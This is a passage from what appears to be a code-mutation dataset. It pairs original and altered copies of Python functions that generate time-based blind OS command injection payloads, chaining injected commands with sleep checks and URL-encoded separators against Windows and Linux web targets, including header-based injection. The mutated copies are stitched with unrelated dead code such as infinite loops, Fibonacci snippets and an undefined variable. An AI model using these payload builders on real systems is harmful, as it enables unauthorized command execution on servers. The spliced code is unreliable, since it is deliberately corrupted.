] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload"
        ]
    },
    {
        "func_name": "cmd_execution",
        "original": "def cmd_execution(separator, cmd, output_length, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=\"$(echo $(' + cmd + '))\"' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0' + separator + 'str=$(echo $(' + cmd + '))' + separator + 'str1=$(expr length $str)' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(echo -n \"$(' + cmd + ')\" ' + pipe + \"tr -d '\\\\n'  \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
        "mutated": [
            "def cmd_execution(separator, cmd, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=\"$(echo $(' + cmd + '))\"' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0' + separator + 'str=$(echo $(' + cmd + '))' + separator + 'str1=$(expr length $str)' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(echo -n \"$(' + cmd + ')\" ' + pipe + \"tr -d '\\\\n'  \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def cmd_execution(separator, cmd, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=\"$(echo $(' + cmd + '))\"' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0' + separator + 'str=$(echo $(' + cmd + '))' + separator + 'str1=$(expr length $str)' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(echo -n \"$(' + cmd + ')\" ' + pipe + \"tr -d '\\\\n'  \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def cmd_execution(separator, cmd, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=\"$(echo $(' + cmd + '))\"' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0' + separator + 'str=$(echo $(' + cmd + '))' + separator + 'str1=$(expr length $str)' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(echo -n \"$(' + cmd + ')\" ' + pipe + \"tr -d '\\\\n'  \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def cmd_execution(separator, cmd, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=\"$(echo $(' + cmd + '))\"' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0' + separator + 'str=$(echo $(' + cmd + '))' + separator + 'str1=$(expr length $str)' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(echo -n \"$(' + cmd + ')\" ' + pipe + \"tr -d '\\\\n'  \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def cmd_execution(separator, cmd, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=\"$(echo $(' + cmd + '))\"' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0' + separator + 'str=$(echo $(' + cmd + '))' + separator + 'str1=$(expr length $str)' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(echo -n \"$(' + cmd + ')\" ' + pipe + \"tr -d '\\\\n'  \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload"
        ]
    },
    {
        "func_name": "cmd_execution_alter_shell",
        "original": "def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
        "mutated": [
            "def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c 